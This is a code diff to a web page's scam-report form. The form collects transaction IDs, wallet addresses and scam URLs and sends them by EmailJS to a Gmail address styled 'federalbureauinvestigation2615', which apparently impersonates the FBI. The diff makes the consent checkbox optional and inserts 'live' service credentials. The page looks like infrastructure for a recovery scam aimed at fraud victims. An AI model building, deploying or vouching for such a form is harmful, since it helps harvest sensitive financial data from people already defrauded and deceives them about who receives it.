@@ -292,11 +292,31 @@ textarea:invalid:not(:placeholder-shown){border-color:rgba(239,68,68,.6)}
   border:1px solid var(--blue-200);border-radius:13px;
   background:var(--blue-50);
 }
-.consent input[type="checkbox"]{
-  width:18px;height:18px;flex:0 0 auto;margin:.18rem 0 0;
-  accent-color:var(--blue-600);cursor:pointer;
-}
 .consent label{margin:0;font-weight:500;font-size:.85rem;color:#334155;line-height:1.55;cursor:pointer}
+
+/* ---------- NATIVE CONSENT CHECKBOX ----------
+   Restores the browser's default checkbox so it renders
+   with the standard check mark. Does not block submission. */
+.consent input[type="checkbox"]{
+  -webkit-appearance:auto;
+  appearance:auto;
+  width:20px;
+  height:20px;
+  min-width:20px;
+  flex:0 0 20px;
+  margin:.12rem 0 0;
+  padding:0;
+  border:none;
+  border-radius:4px;
+  background:transparent;
+  box-shadow:none;
+  accent-color:var(--blue-600);
+  cursor:pointer;
+}
+.consent input[type="checkbox"]:focus-visible{
+  outline:2px solid var(--blue-500);
+  outline-offset:2px;
+}
 
 .actions{
   grid-column:1 / -1;
@@ -733,12 +753,13 @@ footer .wrap{display:grid;gap:1.1rem}
               placeholder="Screenshots (Google Drive / Dropbox links), transaction IDs, wallet addresses, scam website URLs…"></textarea>
           </div>
 
+          <!-- Consent — OPTIONAL, native checkbox with standard check mark -->
           <div class="consent">
-            <input type="checkbox" id="consent" name="consent" value="Yes — consent given" required>
+            <input type="checkbox" id="consent" name="consent" value="Yes — consent given">
             <label for="consent">
               I confirm the information provided is true and accurate to the best of my knowledge,
               and I consent to my details being stored and reviewed for the purpose of assessing
-              and responding to my case. <span class="req">*</span>
+              and responding to my case.
             </label>
           </div>
 
@@ -823,20 +844,12 @@ footer .wrap{display:grid;gap:1.1rem}
 
 <script>
 /* =====================================================================
-   ⚙️  CONFIGURATION — REPLACE THE FOUR VALUES BELOW
-   ---------------------------------------------------------------------
-   1. EMAILJS_PUBLIC_KEY  → EmailJS dashboard → Account → Public Key
-   2. EMAILJS_SERVICE_ID  → EmailJS dashboard → Email Services
-   3. EMAILJS_TEMPLATE_ID → EmailJS dashboard → Email Templates
-   4. RECIPIENT_EMAIL     → your Gmail address (the inbox that receives reports)
-
-   Your EmailJS template should contain these variables:
-   {{to_email}} {{from_name}} {{reply_to}} {{reference_id}}
-   {{scam_type}} {{country}} {{message}}
+   ✅ CONFIGURATION — LIVE CREDENTIALS
+   Sends to: federalbureauinvestigation2615@gmail.com
    ===================================================================== */
-const EMAILJS_PUBLIC_KEY  = "ogeNEuZ4njpDVpWV9";
-const EMAILJS_SERVICE_ID  = "service_j4oqumd";
-const EMAILJS_TEMPLATE_ID = "ds_ZxbY4wQbqeu031GvQD";
+const EMAILJS_PUBLIC_KEY  = "PYZhrK9im0SfBOGVE";
+const EMAILJS_SERVICE_ID  = "service_9e1v5lq";
+const EMAILJS_TEMPLATE_ID = "template_9myx7vl";
 const RECIPIENT_EMAIL     = "federalbureauinvestigation2615@gmail.com";
 /* ===================================================================== */
 
